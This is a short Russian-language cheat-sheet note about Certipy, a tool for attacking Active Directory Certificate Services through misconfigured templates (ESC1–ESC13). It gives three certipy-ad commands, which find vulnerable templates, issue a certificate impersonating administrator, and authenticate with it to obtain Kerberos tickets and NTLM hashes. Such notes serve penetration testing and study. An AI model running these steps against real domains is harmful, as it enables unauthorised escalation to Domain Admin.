#tool #windows #AD #cert

> Это инструмент для **атаки на Active Directory через Certificate Services (AD CS)**

Он эксплуатирует ошибки в настройке корпоративного центра сертификации (CA), позволяя:
- выпускать сертификаты **от имени других пользователей**
- логиниться в домен как **Domain Admin**
- получать Kerberos‑билеты и NTLM‑хэши
- создавать **скрытую и устойчивую эскалацию привилегий**

Этот класс атак известен как:  
**Certified Pre‑Owned (ESC1–ESC13)**

## Как работает

- Подключается к LDAP и CA
- Читает шаблоны сертификатов
- Проверяет права на enrollment
- Ищет условия атак ESC1–ESC13
- Выпускает сертификат, если возможно
- Использует сертификат для Kerberos‑логина

## Эксплуатация

### 1) Поиск уязвимых шаблонов
```bash
certipy-ad find -u user@domain -p pass -dc-ip <ip>
```

### 2) Выпуск сертификата от имени другого пользователя
```bash
certipy-ad req -u user@domain -p pass \
-template VulnerableTemplate \
-upn administrator@domain.local
```

### 3) Аутентификация по сертификату (без пароля)
```bash
certipy-ad auth -pfx admin.pfx
```

